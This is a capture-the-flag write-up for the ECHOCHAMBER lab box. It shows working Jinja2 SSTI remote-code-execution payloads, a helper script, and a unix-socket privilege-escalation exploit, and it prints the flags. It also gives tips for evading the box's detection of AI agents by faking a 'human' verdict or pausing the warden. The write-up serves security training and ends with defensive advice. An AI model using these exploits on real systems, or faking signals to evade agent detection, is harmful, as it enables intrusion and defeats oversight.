---
title: "ECHOCHAMBER — Boot2Root"
description: "The box protects its flags with a warden (/opt/warden/warden.py, runs as root). The real flag files live in /var/lib/warden/real/, while the decoys live in /var/lib/warden/decoy/. The…"
event: "isfcr"
category: "boot2root"
categoryLabel: "Boot2Root"
tags: ["ISFCR CTF 2026","boot2root"]
date: "2026-10-10"
teammate: false
source: "isfcr/writeups/echochamber-user-and-root.md"
---

Target: `10.49.153.33` (hostname `echochamber`, Debian 12, kernel 6.12)
Flags: `user.txt`, `root.txt` (vaulted behind a symlink-flipping "warden")

## TL;DR

| Stage | Vector | Result |
|-------|--------|--------|
| Foothold | Jinja2 SSTI in `/api/alert/preview` | RCE as `analyst` |
| Privesc | World-writable `/run/sentinel/ctrl.sock`, sentinel runs with `CAP_DAC_READ_SEARCH`, nonce gate computable from source | Read any file as `sentinel`, incl. `/root/root.txt` |

Flags:
```
user.txt: isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}
root.txt: isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}
```

## Concept

The box protects its flags with a **warden** (`/opt/warden/warden.py`, runs as root). The
real flag files live in `/var/lib/warden/real/`, while the decoys live in
`/var/lib/warden/decoy/`. The warden atomically repoints these symlinks:

```
/home/sentinel/user.txt     -> /var/lib/warden/{real,decoy}/user.txt
/root/root.txt              -> /var/lib/warden/{real,decoy}/root.txt
/etc/sentinel/dispatch.json -> /var/lib/warden/{real,decoy}/dispatch.json
/etc/sentinel/suid.conf     -> /var/lib/warden/{real,decoy}/suid.conf
```

It reads verdicts from `/var/log/echo/verdicts.jsonl`. If any tracked session is classified
`agent` (and not stale), the warden swaps everything to `decoy`; otherwise it stays on `real`.

The symlinks themselves are useless to `analyst` (no access to `/home/sentinel`, `/root`).
The intended reader is the **sentinel** daemon (`/opt/sentinel/sentinel.py`), which listens on
the world-writable `/run/sentinel/ctrl.sock` and runs with
`AmbientCapabilities=CAP_DAC_READ_SEARCH`. That capability propagates to children, letting it
read *any* file regardless of permissions. The `shell` dispatch op only exists in the **real**
`dispatch.json`, so the whole thing is: keep the warden on `real`, then use the sentinel socket.

## Enumeration

```bash
nmap -Pn -p22,80 -sC -sV 10.49.153.33
# 22/tcp OpenSSH 9.2p1 Debian
# 80/tcp nginx 1.22.1  -> redirects to /login
```

The login page hands you the dev creds:

```
dev console credentials: analyst / analyst
```

The page footer hints at the theme: *"keystroke telemetry via libechotap.so is enabled on this workstation"*.

## Foothold — Jinja2 SSTI

Log in and note the alert detail page advertises a draft-preview API:

```
POST /api/alert/preview  {"title":"...","body":"..."}  ->  {"ok":true,"html":"..."}
```

`/opt/analyst-app/app.py` confirms the bug:

```python
tpl = "<h2>" + title + "</h2>\n<div class='preview-body'>" + body + "</div>"
html = render_template_string(tpl)   # user input is a Jinja2 template
```

Confirm and get RCE:

```bash
COOKIE='session=eyJ1c2VyIjoiYW5hbHlzdCJ9.....'   # from the login response

curl -s -b "$COOKIE" -H 'Content-Type: application/json' \
  -d '{"title":"x","body":"{{7*7}}"}' http://10.49.153.33/api/alert/preview
# {"html":"<h2>x</h2>\n<div class='preview-body'>49</div>","ok":true}

curl -s -b "$COOKIE" -H 'Content-Type: application/json' \
  --data "$(python3 - <<'EOF'
import json
print(json.dumps({"title":"x","body":"{{ cycler.__init__.__globals__.os.popen('id').read() }}"}))
EOF
)" http://10.49.153.33/api/alert/preview
# uid=1001(analyst) gid=1001(analyst) groups=1001(analyst),1004(echo-log)
```

A tidy helper (base64 the command to dodge quoting), e.g. `/tmp/opencode/rc.py`:

```python
import base64, json, sys, urllib.request
cmd = sys.argv[1]
inner = "echo %s | base64 -d | bash" % base64.b64encode(cmd.encode()).decode()
body = "{{ cycler.__init__.__globals__.os.popen('%s').read() }}" % inner
req = urllib.request.Request("http://10.49.153.33/api/alert/preview",
    data=json.dumps({"title":"x","body":body}).encode(),
    headers={"Content-Type":"application/json","Cookie":COOKIE})
print(json.load(urllib.request.urlopen(req, timeout=40))["html"])
```

## Understanding the privesc

Read the published sources as `analyst`:

```bash
python3 rc.py 'cat /opt/warden/warden.py'
python3 rc.py 'cat /opt/sentinel/sentinel.py'
```

Key facts:

* `dispatch.json` **real** variant includes:
  ```json
  { "heartbeat": {"handler":"heartbeat"},
    "status":    {"handler":"status"},
    "shell":     {"handler":"exec_shell", "gate":"nonce_time"} }
  ```
  The **decoy** variant drops `shell`.
* `sentinel.py` exposes the salt in cleartext and computes the gate nonce as:
  ```python
  nonce = sha256(f"{int(time.time())//60}:{SALT}").hexdigest()[:16]
  SALT  = "sentinel-salt-v1-a3b7c2d9"
  ```
* The socket is `srw-rw-rw-` — any user can connect.
* `exec_shell` runs `sh -c <base64 payload>` as the `sentinel` user, inheriting
  `CAP_DAC_READ_SEARCH`, so `cat`/`dd-wrapper` can read `/root/root.txt`.

The warden is currently on `real` because `/var/log/echo/verdicts.jsonl` is empty (no `agent`
verdicts). Verify:

```bash
python3 rc.py 'readlink /etc/sentinel/dispatch.json; cat /var/log/echo/verdicts.jsonl'
# /var/lib/warden/real/dispatch.json
```

> If you *do* get flagged as `agent` and the symlinks flip to `decoy`, either wait for the
> verdict to go stale (20 s) / emit a `human` verdict, or freeze the warden for 60 s by
> writing `pause` to the world-writable `/opt/echochamber/pause` file — then re-check
> `readlink /etc/sentinel/dispatch.json` before connecting.

## Getting the flags

Connect to `/run/sentinel/ctrl.sock` with the computed nonce and an `exec_shell` payload.
The socket is local to the target, so run this through the SSTI RCE:

```python
import socket, json, hashlib, time, base64

SALT = "sentinel-salt-v1-a3b7c2d9"
t = int(time.time()) // 60
nonce = hashlib.sha256(f"{t}:{SALT}".encode()).hexdigest()[:16]

cmd = ("cat /home/sentinel/user.txt; "
       "/opt/sentinel/tools/dd-wrapper /root/root.txt")
payload = base64.b64encode(cmd.encode()).decode()

req = {"op": "shell", "nonce": nonce, "payload": payload}
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/sentinel/ctrl.sock")
s.sendall((json.dumps(req) + "\n").encode())
print(s.recv(65536).decode())
```

Drop it on the box via the RCE helper:

```bash
B64=$(base64 -w0 exploit.py)
python3 rc.py "echo $B64 | base64 -d > /tmp/e.py; python3 /tmp/e.py"
```

Response:

```json
{"ok": true, "rc": 0, "stdout":
  "uid=1003(sentinel) gid=1003(sentinel) groups=1003(sentinel)\n"
  "=== user.txt ===\nisfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}\n"
  "=== root.txt ===\nisfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}\n",
  "stderr": ""}
```

## Manual one-shot (no helper script)

Replace `NONCE` with `python3 -c 'import hashlib,time;print(hashlib.sha256(f"{int(time.time())//60}:sentinel-salt-v1-a3b7c2d9".encode()).hexdigest()[:16])'`
computed in the same minute, then from a shell on the box (or via SSTI):

```bash
# base64 the payload
PAY=$(printf 'id; cat /home/sentinel/user.txt; /opt/sentinel/tools/dd-wrapper /root/root.txt' | base64 -w0)
# send it (python is easiest for a unix socket)
python3 - "$NONCE" "$PAY" <<'PY'
import socket, json, sys
req = {"op":"shell","nonce":sys.argv[1],"payload":sys.argv[2]}
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/sentinel/ctrl.sock")
s.sendall((json.dumps(req)+"\n").encode())
print(s.recv(65536).decode())
PY
```

## Defensive notes

* Never `render_template_string` user input — use static templates / autoescaping.
* Don't ship world-writable control sockets; restrict via group + `SO_PEERCRED`.
* Capabilities on a daemon are as powerful as SUID — treat the socket like a root service.
* A "move-the-flags" scheme is only as strong as the reader service in front of it.
